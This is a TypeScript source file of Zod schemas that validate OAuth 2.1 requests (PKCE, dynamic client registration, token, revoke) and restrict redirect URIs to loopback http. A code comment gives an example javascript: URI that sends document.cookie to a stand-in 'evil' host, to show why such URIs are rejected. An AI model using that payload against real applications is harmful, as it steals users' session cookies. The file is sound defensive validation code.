/*
 * Zod schemas for TokenScope's OAuth 2.1 endpoints (ADR-0005 credential pathway).
 *
 * Ported from a sibling project's shared/schemas/oauth.ts. Single source of truth for
 * request validation, shared by handlers + tests.
 *
 * RFC 7636 (PKCE):
 *   - code_verifier: 43-128 chars, charset [A-Za-z0-9-._~] (§4.1)
 *   - code_challenge: BASE64URL(SHA256(code_verifier)) → exactly 43 chars (§4.2)
 *   - code_challenge_method: S256 only (plain is forbidden by the MCP spec; the
 *     validator at server/auth/oauth.ts also rejects anything but S256).
 */
import { z } from 'zod'

/** RFC 7636 §4.1 unreserved URI charset (base64url + the four punctuation marks). */
const PKCE_CHARSET_REGEX = /^[\w\-.~]+$/
const PKCE_VERIFIER_MIN = 43
const PKCE_VERIFIER_MAX = 128
/** SHA-256 base64url-encoded length (32 bytes → 43 chars, no padding). */
const PKCE_CHALLENGE_LEN = 43

export const pkceCodeVerifierSchema = z
  .string()
  .min(PKCE_VERIFIER_MIN, {
    message: `code_verifier must be at least ${PKCE_VERIFIER_MIN} chars (RFC 7636 §4.1)`,
  })
  .max(PKCE_VERIFIER_MAX, {
    message: `code_verifier must be at most ${PKCE_VERIFIER_MAX} chars (RFC 7636 §4.1)`,
  })
  .regex(PKCE_CHARSET_REGEX, {
    message: 'code_verifier must use unreserved URL charset [A-Za-z0-9-._~] (RFC 7636 §4.1)',
  })

export const pkceCodeChallengeSchema = z
  .string()
  .length(PKCE_CHALLENGE_LEN, {
    message: `code_challenge must be exactly ${PKCE_CHALLENGE_LEN} chars (base64url SHA-256, RFC 7636 §4.2)`,
  })
  .regex(PKCE_CHARSET_REGEX, {
    message: 'code_challenge must use unreserved URL charset [A-Za-z0-9-._~]',
  })

export const pkceCodeChallengeMethodSchema = z.enum(['S256'], {
  message: 'code_challenge_method must be S256 (plain is forbidden)',
})

/*
 * client_name / redirect_uris bounds (S6 — closes `global:config:0005`).
 *
 * Registration is DELIBERATELY anonymous (RFC 7591 open registration is the
 * intended contract) — the fix bounds it, it does not close it. Modelled on
 * the in-repo bounding pattern (server/api/v1/setup/enroll.post.ts's
 * `.max(512)`/`.max(320)`/`.max(512)`, server/utils/mcp.ts's `.max(256)`):
 * cap length, and for client_name additionally constrain charset — but a
 * name in any language/script is legitimate, so the charset check is an
 * ALLOWLIST of Unicode categories (mirrors the allow-the-shapes-we-understand
 * style of server/utils/client-version.ts::SAFE_VERSION_RE) rather than a
 * denylist of specific codepoints: Letters/Numbers/Punctuation/space
 * separators/Symbols are admitted from ANY script; Control (Cc) and Format
 * (Cf — where every bidi override/isolate character and zero-width trick
 * lives, e.g. U+202E RIGHT-TO-LEFT OVERRIDE) plus Separator/Surrogate/
 * Private-use/Unassigned are excluded. One source (this regex-building
 * charset) feeds both the registration-time reject (clientNameSchema below)
 * and the render-time strip (sanitizeClientNameForDisplay) so they can't drift.
 */
export const CLIENT_NAME_MAX_LEN = 128
export const MAX_REDIRECT_URIS = 8
export const REDIRECT_URI_MAX_LEN = 512

const CLIENT_NAME_SAFE_CATEGORIES = '\\p{L}\\p{N}\\p{P}\\p{Zs}\\p{S}'
const CLIENT_NAME_SAFE_REGEX = new RegExp(`^[${CLIENT_NAME_SAFE_CATEGORIES}]*$`, 'u')
const CLIENT_NAME_UNSAFE_REGEX_G = new RegExp(`[^${CLIENT_NAME_SAFE_CATEGORIES}]`, 'gu')

export const clientNameSchema = z
  .string()
  .max(CLIENT_NAME_MAX_LEN, { message: `client_name must be at most ${CLIENT_NAME_MAX_LEN} characters` })
  .regex(CLIENT_NAME_SAFE_REGEX, {
    message: 'client_name must not contain control characters or bidi override/isolate characters',
  })
  .optional()

/**
 * Render-boundary sanitizer for a client_name read out of the DB (grants.vue /
 * account.vue). Registration now rejects the unsafe categories at intake
 * (clientNameSchema above), but rows registered before this fix shipped may
 * still carry them — strip defensively wherever a self-registered name is
 * displayed as another user's/admin's identity signal (S6 Attestation fix).
 */
export function sanitizeClientNameForDisplay(name: string): string {
  const stripped = name.replace(CLIENT_NAME_UNSAFE_REGEX_G, '').trim()
  return stripped.length > CLIENT_NAME_MAX_LEN
    ? stripped.slice(0, CLIENT_NAME_MAX_LEN) + '…'
    : stripped
}

/**
 * A redirect URI that passes `z.string().url()` could still be
 * `javascript:fetch('//evil/?c='+document.cookie)`. Restrict to loopback
 * http:// only — CLI/MCP clients (Claude Code) use loopback redirects per
 * RFC 8252 §7.3, and there is no browser SPA client here that would need https.
 */
const loopbackHttp = z
  .string()
  .max(REDIRECT_URI_MAX_LEN, { message: `redirect_uri must be at most ${REDIRECT_URI_MAX_LEN} characters` })
  .url()
  .refine(
    (url) => {
      try {
        const u = new URL(url)
        return (
          u.protocol === 'http:' &&
          /^(?:localhost|127\.\d+\.\d+\.\d+|\[::1\])$/.test(u.hostname)
        )
      } catch {
        return false
      }
    },
    {
      message:
        'redirect_uri must use loopback http:// (localhost / 127.0.0.0/8 / ::1) per RFC 8252. javascript:, data:, file:, and non-loopback schemes are rejected.',
    },
  )

/** GET /oauth/authorize → /api/v1/oauth/authorize query params. */
export const authorizeQuerySchema = z.object({
  response_type: z.string().optional(),
  client_id: z.string().min(1),
  redirect_uri: z.string().min(1),
  code_challenge: pkceCodeChallengeSchema,
  code_challenge_method: pkceCodeChallengeMethodSchema,
  scope: z.string().optional(),
  // RFC 6749 §10.12 — state is REQUIRED for CSRF protection on the user-agent
  // redirect. Floor at 16 chars so it can't be a trivially-guessable string.
  state: z
    .string()
    .min(16, { message: 'state must be at least 16 chars (RFC 6749 §10.12 — non-guessable random)' }),
})
export type AuthorizeQuery = z.infer<typeof authorizeQuerySchema>

/**
 * POST /api/v1/oauth/authorize — the consent-page grant. Same params as the GET
 * authorize query plus an explicit approve/deny `action`. The browser consent
 * page submits this on the user's Entra session (so the handler is the ONE OAuth
 * endpoint that asserts same-origin). With `Accept: application/json` the handler
 * returns `{ redirect_url }` as DATA (so the page can show a Copy button for
 * containerized clients that can't receive a loopback redirect); otherwise it 302s.
 */
export const authorizeBodySchema = authorizeQuerySchema.extend({
  action: z.enum(['approve', 'deny']),
})
export type AuthorizeBody = z.infer<typeof authorizeBodySchema>

/** POST /api/v1/oauth/token */
export const tokenRequestSchema = z.object({
  grant_type: z.string().min(1),
  code: z.string().optional(),
  redirect_uri: z.string().optional(),
  // Optional at schema level (refresh grant omits it); the handler asserts
  // presence for the authorization_code grant.
  code_verifier: pkceCodeVerifierSchema.optional(),
  client_id: z.string().min(1),
  // Optional at schema level: confidential clients (the interactive MCP flow)
  // MUST present it and the handler enforces that. The internal public emit
  // client (headless refresh_token grant, ADR-0005) is secretless — the handler
  // routes it through a public-client path. NOT optional for any other client.
  client_secret: z.string().min(1).optional(),
  refresh_token: z.string().optional(),
})
export type TokenRequestBody = z.infer<typeof tokenRequestSchema>

/** POST /api/v1/oauth/register (RFC 7591 dynamic client registration). */
export const registrationRequestSchema = z.object({
  client_name: clientNameSchema,
  redirect_uris: z
    .array(loopbackHttp)
    .min(1)
    .max(MAX_REDIRECT_URIS, { message: `At most ${MAX_REDIRECT_URIS} redirect_uris are allowed` }),
  grant_types: z.array(z.string()).optional(),
  token_endpoint_auth_method: z.string().optional(),
  scope: z.string().optional(),
})
export type RegistrationRequestBody = z.infer<typeof registrationRequestSchema>

/** POST /api/v1/oauth/revoke (RFC 7009). */
export const revokeRequestSchema = z.object({
  token: z.string().min(1),
  token_type_hint: z.string().optional(),
  client_id: z.string().min(1),
  client_secret: z.string().min(1),
})
export type RevokeRequestBody = z.infer<typeof revokeRequestSchema>
